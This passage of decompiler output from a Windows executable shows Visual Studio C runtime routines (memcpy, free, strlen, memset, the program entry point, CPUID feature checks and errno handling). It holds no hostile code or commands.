                    // WARNING: Load size is inaccurate
          for (; uVar19 != 0; uVar19 = uVar19 - 1) {
            *puVar25 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar25 = puVar25 + 1;
          }
          switch(uVar20 & 3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00416870_caseD_2;
          case 3:
            goto switchD_00416870_caseD_3;
          }
        }
      }
      goto switchD_00416870_caseD_1;
    }
  }
  else {
    if (((((uint)_Dst ^ (uint)_Src) & 0xf) == 0) && ((DAT_00435000 >> 1 & 1) != 0)) {
      if (((uint)_Src & 0xf) != 0) {
        uVar19 = 0x10 - ((uint)_Src & 0xf);
        _Size = _Size - uVar19;
        for (uVar20 = uVar19 & 3; uVar20 != 0; uVar20 = uVar20 - 1) {
                    // WARNING: Load size is inaccurate
          *(undefined *)puVar25 = *_Src;
          _Src = (void *)((int)_Src + 1);
          puVar25 = (undefined4 *)((int)puVar25 + 1);
        }
        for (uVar19 = uVar19 >> 2; uVar19 != 0; uVar19 = uVar19 - 1) {
                    // WARNING: Load size is inaccurate
          *puVar25 = *_Src;
          _Src = (void *)((int)_Src + 4);
          puVar25 = puVar25 + 1;
        }
      }
      for (uVar20 = _Size >> 7; uVar20 != 0; uVar20 = uVar20 - 1) {
                    // WARNING: Load size is inaccurate
        uVar26 = *(undefined4 *)((int)_Src + 4);
        uVar27 = *(undefined4 *)((int)_Src + 8);
        uVar28 = *(undefined4 *)((int)_Src + 0xc);
        uVar4 = *(undefined4 *)((int)_Src + 0x10);
        uVar5 = *(undefined4 *)((int)_Src + 0x14);
        uVar6 = *(undefined4 *)((int)_Src + 0x18);
        uVar7 = *(undefined4 *)((int)_Src + 0x1c);
        uVar8 = *(undefined4 *)((int)_Src + 0x20);
        uVar9 = *(undefined4 *)((int)_Src + 0x24);
        uVar10 = *(undefined4 *)((int)_Src + 0x28);
        uVar11 = *(undefined4 *)((int)_Src + 0x2c);
        uVar12 = *(undefined4 *)((int)_Src + 0x30);
        uVar13 = *(undefined4 *)((int)_Src + 0x34);
        uVar14 = *(undefined4 *)((int)_Src + 0x38);
        uVar15 = *(undefined4 *)((int)_Src + 0x3c);
        *puVar25 = *_Src;
        puVar25[1] = uVar26;
        puVar25[2] = uVar27;
        puVar25[3] = uVar28;
        puVar25[4] = uVar4;
        puVar25[5] = uVar5;
        puVar25[6] = uVar6;
        puVar25[7] = uVar7;
        puVar25[8] = uVar8;
        puVar25[9] = uVar9;
        puVar25[10] = uVar10;
        puVar25[0xb] = uVar11;
        puVar25[0xc] = uVar12;
        puVar25[0xd] = uVar13;
        puVar25[0xe] = uVar14;
        puVar25[0xf] = uVar15;
        uVar26 = *(undefined4 *)((int)_Src + 0x44);
        uVar27 = *(undefined4 *)((int)_Src + 0x48);
        uVar28 = *(undefined4 *)((int)_Src + 0x4c);
        uVar4 = *(undefined4 *)((int)_Src + 0x50);
        uVar5 = *(undefined4 *)((int)_Src + 0x54);
        uVar6 = *(undefined4 *)((int)_Src + 0x58);
        uVar7 = *(undefined4 *)((int)_Src + 0x5c);
        uVar8 = *(undefined4 *)((int)_Src + 0x60);
        uVar9 = *(undefined4 *)((int)_Src + 100);
        uVar10 = *(undefined4 *)((int)_Src + 0x68);
        uVar11 = *(undefined4 *)((int)_Src + 0x6c);
        uVar12 = *(undefined4 *)((int)_Src + 0x70);
        uVar13 = *(undefined4 *)((int)_Src + 0x74);
        uVar14 = *(undefined4 *)((int)_Src + 0x78);
        uVar15 = *(undefined4 *)((int)_Src + 0x7c);
        puVar25[0x10] = *(undefined4 *)((int)_Src + 0x40);
        puVar25[0x11] = uVar26;
        puVar25[0x12] = uVar27;
        puVar25[0x13] = uVar28;
        puVar25[0x14] = uVar4;
        puVar25[0x15] = uVar5;
        puVar25[0x16] = uVar6;
        puVar25[0x17] = uVar7;
        puVar25[0x18] = uVar8;
        puVar25[0x19] = uVar9;
        puVar25[0x1a] = uVar10;
        puVar25[0x1b] = uVar11;
        puVar25[0x1c] = uVar12;
        puVar25[0x1d] = uVar13;
        puVar25[0x1e] = uVar14;
        puVar25[0x1f] = uVar15;
        _Src = (void *)((int)_Src + 0x80);
        puVar25 = puVar25 + 0x20;
      }
      if ((_Size & 0x7f) != 0) {
        for (uVar20 = (_Size & 0x7f) >> 4; uVar20 != 0; uVar20 = uVar20 - 1) {
                    // WARNING: Load size is inaccurate
          uVar26 = *(undefined4 *)((int)_Src + 4);
          uVar27 = *(undefined4 *)((int)_Src + 8);
          uVar28 = *(undefined4 *)((int)_Src + 0xc);
          *puVar25 = *_Src;
          puVar25[1] = uVar26;
          puVar25[2] = uVar27;
          puVar25[3] = uVar28;
          _Src = (void *)((int)_Src + 0x10);
          puVar25 = puVar25 + 4;
        }
        if ((_Size & 0xf) != 0) {
          for (uVar20 = (_Size & 0xf) >> 2; uVar20 != 0; uVar20 = uVar20 - 1) {
                    // WARNING: Load size is inaccurate
            *puVar25 = *_Src;
            _Src = (void *)((int)_Src + 4);
            puVar25 = puVar25 + 1;
          }
          for (uVar20 = _Size & 3; uVar20 != 0; uVar20 = uVar20 - 1) {
                    // WARNING: Load size is inaccurate
            *(undefined *)puVar25 = *_Src;
            _Src = (void *)((int)_Src + 1);
            puVar25 = (undefined4 *)((int)puVar25 + 1);
          }
        }
      }
      return _Dst;
    }
    if ((DAT_004369e8 & 1) == 0) goto LAB_0041683b;
    if (((uint)_Dst & 3) != 0) goto LAB_00416858;
    if (((uint)_Src & 3) == 0) {
      if (((uint)_Dst >> 2 & 1) != 0) {
                    // WARNING: Load size is inaccurate
        uVar26 = *_Src;
        _Size = _Size - 4;
        _Src = (void *)((int)_Src + 4);
        *(undefined4 *)_Dst = uVar26;
        _Dst = (void *)((int)_Dst + 4);
      }
      if (((uint)_Dst >> 3 & 1) != 0) {
                    // WARNING: Load size is inaccurate
        uVar1 = *_Src;
        _Size = _Size - 8;
        _Src = (void *)((int)_Src + 8);
        *(undefined8 *)_Dst = uVar1;
        _Dst = (void *)((int)_Dst + 8);
      }
      if (((uint)_Src & 7) == 0) {
                    // WARNING: Load size is inaccurate
        puVar17 = (undefined8 *)((int)_Src + -8);
        uVar26 = *_Src;
        uVar27 = *(undefined4 *)((int)_Src + 4);
        do {
          puVar22 = puVar17;
          uVar5 = *(undefined4 *)(puVar22 + 4);
          uVar6 = *(undefined4 *)((int)puVar22 + 0x24);
          _Size = _Size - 0x30;
          auVar2 = *(undefined (*) [32])(puVar22 + 2);
          uVar28 = *(undefined4 *)(puVar22 + 7);
          uVar4 = *(undefined4 *)((int)puVar22 + 0x3c);
          auVar3 = *(undefined (*) [32])(puVar22 + 4);
          *(undefined4 *)((int)_Dst + 8) = uVar26;
          *(undefined4 *)((int)_Dst + 0xc) = uVar27;
          *(undefined4 *)((int)_Dst + 0x10) = uVar5;
          *(undefined4 *)((int)_Dst + 0x14) = uVar6;
          *(undefined (*) [16])((int)_Dst + 0x10) = SUB3216(auVar2 >> 0x40,0);
          *(undefined (*) [16])((int)_Dst + 0x20) = SUB3216(auVar3 >> 0x40,0);
          _Dst = (void *)((int)_Dst + 0x30);
          puVar17 = puVar22 + 6;
          uVar26 = uVar28;
          uVar27 = uVar4;
        } while (0x2f < (int)_Size);
        puVar22 = puVar22 + 7;
      }
      else if (((uint)_Src >> 3 & 1) == 0) {
                    // WARNING: Load size is inaccurate
        iVar16 = (int)_Src + -4;
        uVar26 = *_Src;
        uVar27 = *(undefined4 *)((int)_Src + 4);
        uVar28 = *(undefined4 *)((int)_Src + 8);
        do {
          iVar21 = iVar16;
          uVar7 = *(undefined4 *)(iVar21 + 0x20);
          _Size = _Size - 0x30;
          auVar2 = *(undefined (*) [32])(iVar21 + 0x10);
          uVar4 = *(undefined4 *)(iVar21 + 0x34);
          uVar5 = *(undefined4 *)(iVar21 + 0x38);
          uVar6 = *(undefined4 *)(iVar21 + 0x3c);
          auVar3 = *(undefined (*) [32])(iVar21 + 0x20);
          *(undefined4 *)((int)_Dst + 4) = uVar26;
          *(undefined4 *)((int)_Dst + 8) = uVar27;
          *(undefined4 *)((int)_Dst + 0xc) = uVar28;
          *(undefined4 *)((int)_Dst + 0x10) = uVar7;
          *(undefined (*) [16])((int)_Dst + 0x10) = SUB3216(auVar2 >> 0x20,0);
          *(undefined (*) [16])((int)_Dst + 0x20) = SUB3216(auVar3 >> 0x20,0);
          _Dst = (void *)((int)_Dst + 0x30);
          iVar16 = iVar21 + 0x30;
          uVar26 = uVar4;
          uVar27 = uVar5;
          uVar28 = uVar6;
        } while (0x2f < (int)_Size);
        puVar22 = (undefined8 *)(iVar21 + 0x34);
      }
      else {
                    // WARNING: Load size is inaccurate
        iVar16 = (int)_Src + -0xc;
        uVar26 = *_Src;
        do {
          iVar21 = iVar16;
          uVar28 = *(undefined4 *)(iVar21 + 0x20);
          uVar4 = *(undefined4 *)(iVar21 + 0x24);
          uVar5 = *(undefined4 *)(iVar21 + 0x28);
          _Size = _Size - 0x30;
          auVar2 = *(undefined (*) [32])(iVar21 + 0x10);
          uVar27 = *(undefined4 *)(iVar21 + 0x3c);
          auVar3 = *(undefined (*) [32])(iVar21 + 0x20);
          *(undefined4 *)((int)_Dst + 0xc) = uVar26;
          *(undefined4 *)((int)_Dst + 0x10) = uVar28;
          *(undefined4 *)((int)_Dst + 0x14) = uVar4;
          *(undefined4 *)((int)_Dst + 0x18) = uVar5;
          *(undefined (*) [16])((int)_Dst + 0x10) = SUB3216(auVar2 >> 0x60,0);
          *(undefined (*) [16])((int)_Dst + 0x20) = SUB3216(auVar3 >> 0x60,0);
          _Dst = (void *)((int)_Dst + 0x30);
          iVar16 = iVar21 + 0x30;
          uVar26 = uVar27;
        } while (0x2f < (int)_Size);
        puVar22 = (undefined8 *)(iVar21 + 0x3c);
      }
      for (; 0xf < (int)_Size; _Size = _Size - 0x10) {
        uVar26 = *(undefined4 *)puVar22;
        uVar27 = *(undefined4 *)((int)puVar22 + 4);
        uVar28 = *(undefined4 *)(puVar22 + 1);
        uVar4 = *(undefined4 *)((int)puVar22 + 0xc);
        puVar22 = puVar22 + 2;
        *(undefined4 *)_Dst = uVar26;
        *(undefined4 *)((int)_Dst + 4) = uVar27;
        *(undefined4 *)((int)_Dst + 8) = uVar28;
        *(undefined4 *)((int)_Dst + 0xc) = uVar4;
        _Dst = (void *)((int)_Dst + 0x10);
      }
      if ((_Size >> 2 & 1) != 0) {
        uVar26 = *(undefined4 *)puVar22;
        _Size = _Size - 4;
        puVar22 = (undefined8 *)((int)puVar22 + 4);
        *(undefined4 *)_Dst = uVar26;
        _Dst = (void *)((int)_Dst + 4);
      }
      if ((_Size >> 3 & 1) != 0) {
        _Size = _Size - 8;
        *(undefined8 *)_Dst = *puVar22;
      }
                    // WARNING: Could not recover jumptable at 0x00416839. Too many branches
                    // WARNING: Treating indirect jump as call
      pvVar18 = (void *)(*(code *)(&switchD_00416870::switchdataD_00416968)[_Size])();
      return pvVar18;
    }
  }
  uVar19 = _Size >> 2;
  if (uVar19 < 8) {
LAB_00416878:
                    // WARNING: Could not recover jumptable at 0x00416878. Too many branches
                    // WARNING: Treating indirect jump as call
    pvVar18 = (void *)(*(code *)(&PTR_LAB_004168fc)[uVar19])();
    return pvVar18;
  }
                    // WARNING: Load size is inaccurate
  for (; uVar19 != 0; uVar19 = uVar19 - 1) {
    *puVar25 = *_Src;
    _Src = (undefined4 *)((int)_Src + 4);
    puVar25 = puVar25 + 1;
  }
  switch(_Size & 3) {
  case 0:
    return _Dst;
  case 2:
switchD_00416870_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar25 = *_Src;
    *(undefined *)((int)puVar25 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_00416870_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar25 = *_Src;
    *(undefined *)((int)puVar25 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar25 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_00416870_caseD_1:
                    // WARNING: Load size is inaccurate
  *(undefined *)puVar25 = *_Src;
  return _Dst;
}



// Library Function - Multiple Matches With Different Base Names
//  __free_base
//  _free
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release, Visual Studio 2017 Release,
// Visual Studio 2019 Release

void __cdecl FID_conflict__free(void *_Memory)

{
  BOOL BVar1;
  int *piVar2;
  DWORD DVar3;
  int iVar4;
  
  if (_Memory != (void *)0x0) {
    BVar1 = HeapFree(DAT_004369ec,0,_Memory);
    if (BVar1 == 0) {
      piVar2 = __errno();
      DVar3 = GetLastError();
      iVar4 = __get_errno_from_oserr(DVar3);
      *piVar2 = iVar4;
    }
  }
  return;
}



// Library Function - Single Match
//  _strlen
// 
// Library: Visual Studio

size_t __cdecl _strlen(char *_Str)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)_Str & 3;
  puVar3 = (uint *)_Str;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_00416d13;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (int)puVar4 - (int)_Str;
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (size_t)((int)puVar4 + (1 - (int)_Str));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (size_t)((int)puVar4 + (2 - (int)_Str));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_00416d13:
  return (size_t)((int)puVar3 + (-1 - (int)_Str));
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

PVOID __cdecl FUN_00416d6a(PVOID param_1)

{
  PVOID pvVar1;
  
  FUN_00417587();
  pvVar1 = FUN_00416dae(param_1);
  FUN_00416da8();
  return pvVar1;
}



void FUN_00416da8(void)

{
  FUN_00417590();
  return;
}



PVOID __cdecl FUN_00416dae(PVOID param_1)

{
  PVOID *ppvVar1;
  PVOID *ppvVar2;
  SIZE_T SVar3;
  SIZE_T SVar4;
  PVOID pvVar5;
  int iVar6;
  
  ppvVar1 = (PVOID *)DecodePointer(DAT_00439930);
  ppvVar2 = (PVOID *)DecodePointer(DAT_0043992c);
  if ((ppvVar2 < ppvVar1) || (iVar6 = (int)ppvVar2 - (int)ppvVar1, iVar6 + 4U < 4)) {
    return (PVOID)0x0;
  }
  SVar3 = FUN_004176dc(ppvVar1);
  if (SVar3 < iVar6 + 4U) {
    SVar4 = 0x800;
    if (SVar3 < 0x800) {
      SVar4 = SVar3;
    }
    if ((SVar4 + SVar3 < SVar3) ||
       (pvVar5 = FUN_0041779c(ppvVar1,SVar4 + SVar3), pvVar5 == (void *)0x0)) {
      if (SVar3 + 0x10 < SVar3) {
        return (PVOID)0x0;
      }
      pvVar5 = FUN_0041779c(ppvVar1,SVar3 + 0x10);
      if (pvVar5 == (void *)0x0) {
        return (PVOID)0x0;
      }
    }
    ppvVar2 = (PVOID *)((int)pvVar5 + (iVar6 >> 2) * 4);
    DAT_00439930 = EncodePointer(pvVar5);
  }
  pvVar5 = EncodePointer(param_1);
  *ppvVar2 = pvVar5;
  DAT_0043992c = EncodePointer(ppvVar2 + 1);
  return param_1;
}



int __cdecl FUN_00416e66(PVOID param_1)

{
  PVOID pvVar1;
  
  pvVar1 = FUN_00416d6a(param_1);
  return (pvVar1 != (PVOID)0x0) - 1;
}



uint * __cdecl FUN_00416e80(uint *param_1,byte param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint *puVar4;
  
  if (param_3 == 0) {
    return param_1;
  }
  uVar1 = (uint)param_2;
  puVar4 = param_1;
  if ((DAT_004369e8 >> 1 & 1) == 0) {
    if ((0x7f < (int)param_3) && ((DAT_00435000 >> 1 & 1) != 0)) {
      if (uVar1 == 0) {
        uVar1 = 0;
      }
      else {
        uVar1 = SUB164(CONCAT142(ZEXT214(0) & SUB1614((undefined  [16])0xffffffffff000000 >> 0x10,0)
                                 & SUB1614((undefined  [16])0xffffffffff00ffff >> 0x10,0),
                                 CONCAT11(param_2,param_2)),0);
        uVar1 = uVar1 | uVar1 << 0x10;
      }
      if (((uint)param_1 & 0xf) != 0) {
        uVar2 = 0x10 - ((uint)param_1 & 0xf);
        param_3 = param_3 - uVar2;
        for (uVar3 = uVar2 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
          *(byte *)puVar4 = param_2;
          puVar4 = (uint *)((int)puVar4 + 1);
        }
        for (uVar2 = uVar2 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = uVar1;
          puVar4 = puVar4 + 1;
        }
      }
      for (uVar3 = param_3 >> 7; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar4 = uVar1;
        puVar4[1] = uVar1;
        puVar4[2] = uVar1;
        puVar4[3] = uVar1;
        puVar4[4] = uVar1;
        puVar4[5] = uVar1;
        puVar4[6] = uVar1;
        puVar4[7] = uVar1;
        puVar4[8] = uVar1;
        puVar4[9] = uVar1;
        puVar4[10] = uVar1;
        puVar4[0xb] = uVar1;
        puVar4[0xc] = uVar1;
        puVar4[0xd] = uVar1;
        puVar4[0xe] = uVar1;
        puVar4[0xf] = uVar1;
        puVar4[0x10] = uVar1;
        puVar4[0x11] = uVar1;
        puVar4[0x12] = uVar1;
        puVar4[0x13] = uVar1;
        puVar4[0x14] = uVar1;
        puVar4[0x15] = uVar1;
        puVar4[0x16] = uVar1;
        puVar4[0x17] = uVar1;
        puVar4[0x18] = uVar1;
        puVar4[0x19] = uVar1;
        puVar4[0x1a] = uVar1;
        puVar4[0x1b] = uVar1;
        puVar4[0x1c] = uVar1;
        puVar4[0x1d] = uVar1;
        puVar4[0x1e] = uVar1;
        puVar4[0x1f] = uVar1;
        puVar4 = puVar4 + 0x20;
      }
      if ((param_3 & 0x7f) != 0) {
        for (uVar3 = (param_3 & 0x7f) >> 4; uVar3 != 0; uVar3 = uVar3 - 1) {
          *puVar4 = uVar1;
          puVar4[1] = uVar1;
          puVar4[2] = uVar1;
          puVar4[3] = uVar1;
          puVar4 = puVar4 + 4;
        }
        if ((param_3 & 0xf) != 0) {
          for (uVar3 = (param_3 & 0xf) >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
            *puVar4 = uVar1;
            puVar4 = puVar4 + 1;
          }
          for (uVar1 = param_3 & 3; uVar1 != 0; uVar1 = uVar1 - 1) {
            *(byte *)puVar4 = param_2;
            puVar4 = (uint *)((int)puVar4 + 1);
          }
        }
      }
      return param_1;
    }
    if (3 < param_3) {
      uVar2 = -(int)param_1 & 3;
      uVar3 = param_3;
      if (uVar2 != 0) {
        uVar3 = param_3 - uVar2;
        do {
          *(byte *)puVar4 = param_2;
          puVar4 = (uint *)((int)puVar4 + 1);
          uVar2 = uVar2 - 1;
        } while (uVar2 != 0);
      }
      uVar1 = uVar1 * 0x1010101;
      param_3 = uVar3 & 3;
      uVar3 = uVar3 >> 2;
      if (uVar3 != 0) {
        for (; uVar3 != 0; uVar3 = uVar3 - 1) {
          *puVar4 = uVar1;
          puVar4 = puVar4 + 1;
        }
        if (param_3 == 0) {
          return param_1;
        }
      }
    }
    do {
      *(char *)puVar4 = (char)uVar1;
      puVar4 = (uint *)((int)puVar4 + 1);
      param_3 = param_3 - 1;
    } while (param_3 != 0);
  }
  else {
    for (; param_3 != 0; param_3 = param_3 - 1) {
      *(byte *)puVar4 = param_2;
      puVar4 = (uint *)((int)puVar4 + 1);
    }
  }
  return param_1;
}



void __cdecl FID_conflict__free(void *_Memory)

{
  BOOL BVar1;
  int *piVar2;
  DWORD DVar3;
  int iVar4;
  
  if (_Memory != (void *)0x0) {
    BVar1 = HeapFree(DAT_004369ec,0,_Memory);
    if (BVar1 == 0) {
      piVar2 = __errno();
      DVar3 = GetLastError();
      iVar4 = __get_errno_from_oserr(DVar3);
      *piVar2 = iVar4;
    }
  }
  return;
}



void FUN_00416f15(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)DecodePointer(DAT_00436a28);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
  }
  FUN_00417aac(0,1);
  _abort();
  return;
}



PVOID __cdecl FUN_00416f37(PVOID param_1)

{
  PVOID pvVar1;
  
  pvVar1 = DecodePointer(DAT_00436a28);
  DAT_00436a28 = EncodePointer(param_1);
  return pvVar1;
}



undefined4 * __thiscall FUN_00416f5c(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_alloc::vftable;
  return (undefined4 *)this;
}



void __cdecl FUN_00416f82(size_t param_1)

{
  code *pcVar1;
  int iVar2;
  void *pvVar3;
  undefined **local_14 [3];
  char *local_8;
  
  do {
    pvVar3 = _malloc(param_1);
    if (pvVar3 != (void *)0x0) {
      return;
    }
    iVar2 = __callnewh(param_1);
  } while (iVar2 != 0);
  local_8 = "bad allocation";
  FUN_00418434(local_14,&local_8);
  local_14[0] = std::bad_alloc::vftable;
  FUN_0041856f((int *)local_14,&DAT_004324ec);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



undefined4 * __thiscall FUN_00416fd3(void *this,byte param_1)

{
  *(undefined ***)this = std::bad_alloc::vftable;
  FUN_00418472((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  _fast_error_exit
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void __cdecl _fast_error_exit(int param_1)

{
  if (DAT_00437378 == 1) {
    __FF_MSGBANNER();
  }
  FUN_004190f9(param_1);
  ___crtExitProcess(0xff);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x00417022)

DWORD entry(void)

{
  bool bVar1;
  undefined3 extraout_var;
  int iVar2;
  DWORD _Code;
  undefined4 extraout_ECX;
  undefined2 extraout_DX;
  undefined2 extraout_DX_00;
  undefined2 uVar3;
  undefined4 uVar4;
  
  ___security_init_cookie();
  FUN_004194ba();
  FUN_004192b6(2);
  bVar1 = FUN_004173c6();
  if (CONCAT31(extraout_var,bVar1) == 0) {
    _fast_error_exit(0x1c);
  }
  iVar2 = FUN_00418a36();
  if (iVar2 == 0) {
    _fast_error_exit(0x10);
  }
  FUN_0041939f();
  iVar2 = FUN_00418ac9();
  if (iVar2 < 0) {
    _fast_error_exit(0x1b);
  }
  DAT_0043993c = GetCommandLineW();
  DAT_004369e0 = FUN_004193df();
  iVar2 = FUN_00418d7d();
  uVar4 = extraout_ECX;
  uVar3 = extraout_DX;
  if (iVar2 < 0) {
    uVar4 = 8;
    __amsg_exit(8);
    uVar3 = extraout_DX_00;
  }
  iVar2 = FUN_00418fba(uVar4,uVar3);
  if (iVar2 < 0) {
    __amsg_exit(9);
  }
  iVar2 = FUN_0041745f(1);
  if (iVar2 != 0) {
    __amsg_exit(iVar2);
  }
  __wwincmdln();
  _Code = FUN_00401698();
  _exit(_Code);
  __cexit();
  return _Code;
}



// Library Function - Single Match
//  _memmove_s
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release, Visual Studio 2017 Release,
// Visual Studio 2019 Release

errno_t __cdecl _memmove_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  int *piVar1;
  errno_t eVar2;
  
  if (_MaxCount == 0) {
LAB_004171c0:
    eVar2 = 0;
  }
  else {
    if ((_Dst == (void *)0x0) || (_Src == (void *)0x0)) {
      piVar1 = __errno();
      eVar2 = 0x16;
    }
    else {
      if (_MaxCount <= _DstSize) {
        FID_conflict__memcpy(_Dst,_Src,_MaxCount);
        goto LAB_004171c0;
      }
      piVar1 = __errno();
      eVar2 = 0x22;
    }
    *piVar1 = eVar2;
    FUN_00419a8d();
  }
  return eVar2;
}



// WARNING: Removing unreachable block (ram,0x004171f5)
// WARNING: Removing unreachable block (ram,0x004172b1)
// WARNING: Removing unreachable block (ram,0x00417245)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __fastcall FUN_004171c5(int param_1,undefined2 param_2)

{
  int *piVar1;
  uint *puVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  
  _DAT_004369e4 = 0;
  DAT_00435000 = DAT_00435000 | 1;
  iVar3 = FUN_00422f06(param_1,param_2);
  uVar4 = DAT_00435000;
  if (iVar3 != 0) {
    _DAT_004369e4 = 1;
    piVar1 = (int *)cpuid_basic_info(0);
    puVar2 = (uint *)cpuid_Version_info(1);
    uVar5 = puVar2[3];
    if (((piVar1[2] ^ 0x49656e69U | piVar1[3] ^ 0x6c65746eU | piVar1[1] ^ 0x756e6547U) == 0) &&
       (((((uVar4 = *puVar2 & 0xfff3ff0, uVar4 == 0x106c0 || (uVar4 == 0x20660)) ||
          (uVar4 == 0x20670)) || ((uVar4 == 0x30650 || (uVar4 == 0x30660)))) || (uVar4 == 0x30670)))
       ) {
      DAT_004369e8 = DAT_004369e8 | 1;
    }
    if (*piVar1 < 7) {
      uVar6 = 0;
    }
    else {
      iVar3 = cpuid_Extended_Feature_Enumeration_info(7);
      uVar6 = *(uint *)(iVar3 + 4);
      if ((uVar6 & 0x200) != 0) {
        DAT_004369e8 = DAT_004369e8 | 2;
      }
    }
    uVar4 = DAT_00435000 | 2;
    if ((uVar5 & 0x100000) != 0) {
      _DAT_004369e4 = 2;
      uVar4 = DAT_00435000 | 6;
      if (((uVar5 & 0x8000000) != 0) && ((uVar5 & 0x10000000) != 0)) {
        _DAT_004369e4 = 3;
        uVar4 = DAT_00435000 | 0xe;
        if ((uVar6 & 0x20) != 0) {
          _DAT_004369e4 = 5;
          uVar4 = DAT_00435000 | 0x2e;
        }
      }
    }
  }
  DAT_00435000 = uVar4;
  return 0;
}



// Library Function - Single Match
//  ___doserrno
// 
// Library: Visual Studio 2012 Release

ulong * __cdecl ___doserrno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (ulong *)&DAT_00435174;
  }
  return &p_Var1->_tdoserrno;
}



// Library Function - Multiple Matches With Different Base Names
//  ___acrt_errno_map_os_error
//  __dosmaperr
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release, Visual Studio 2017 Release,
// Visual Studio 2019 Release

void __cdecl FID_conflict___dosmaperr(ulong param_1)

{
  ulong *puVar1;
  int iVar2;
  int *piVar3;
  
  puVar1 = ___doserrno();
  *puVar1 = param_1;
  iVar2 = __get_errno_from_oserr(param_1);
  piVar3 = __errno();
  *piVar3 = iVar2;
  return;
}



// Library Function - Single Match
//  __errno
// 
// Library: Visual Studio 2012 Release

int * __cdecl __errno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (int *)&DAT_00435170;
  }
  return &p_Var1->_terrno;
}



// Library Function - Single Match
//  __get_errno_from_oserr
// 
// Library: Visual Studio 2012 Release

int __cdecl __get_errno_from_oserr(ulong param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_00435008)[uVar1 * 2]) {
      return (&DAT_0043500c)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x2d);
  if (param_1 - 0x13 < 0x12) {
    return 0xd;
  }
  return (-(uint)(0xe < param_1 - 0xbc) & 0xe) + 8;
}



bool FUN_004173c6(void)

{
  DAT_004369ec = GetProcessHeap();
  return DAT_004369ec != (HANDLE)0x0;
}



void __cdecl FUN_004173db(undefined4 param_1)

{
  BOOL BVar1;
  FARPROC pFVar2;
  HMODULE local_8;
  
  BVar1 = GetModuleHandleExW(0,L"mscoree.dll",&local_8);
  if (BVar1 != 0) {
    pFVar2 = GetProcAddress(local_8,"CorExitProcess");
    if (pFVar2 != (FARPROC)0x0) {
      (*pFVar2)(param_1);
    }
  }
  return;
}



// Library Function - Single Match
//  ___crtExitProcess
// 
// Library: Visual Studio 2012 Release

void __cdecl ___crtExitProcess(int param_1)

{
  FUN_004173db(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



// Library Function - Single Match
//  __amsg_exit
// 
// Library: Visual Studio 2012 Release

void __cdecl __amsg_exit(int param_1)

{
  code *pcVar1;
  
  __FF_MSGBANNER();
  FUN_004190f9(param_1);
  __exit(0xff);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __cexit
// 
// Library: Visual Studio 2012 Release

void __cdecl __cexit(void)

{
  _doexit(0,0,1);
  return;
}



int __cdecl FUN_0041745f(int param_1)

{
  BOOL BVar1;
  int iVar2;
  
  BVar1 = __IsNonwritableInCurrentImage((PBYTE)&PTR_FUN_00428658);
  if (BVar1 != 0) {
    FUN_00418306(param_1);
  }
  FUN_00419db1();
  iVar2 = __initterm_e((undefined **)&DAT_00428440,(undefined **)&DAT_00428458);
  if (iVar2 == 0) {
    FUN_00416e66(&LAB_004193bf);
    FUN_0041752f((undefined **)&DAT_004283c0,(undefined **)&DAT_0042843c);
    if ((DAT_00439928 != (code *)0x0) &&
       (BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_00439928), BVar1 != 0)) {
      (*DAT_00439928)(0,2,0);
    }
    iVar2 = 0;
  }
  return iVar2;
}



// Library Function - Single Match
//  __exit
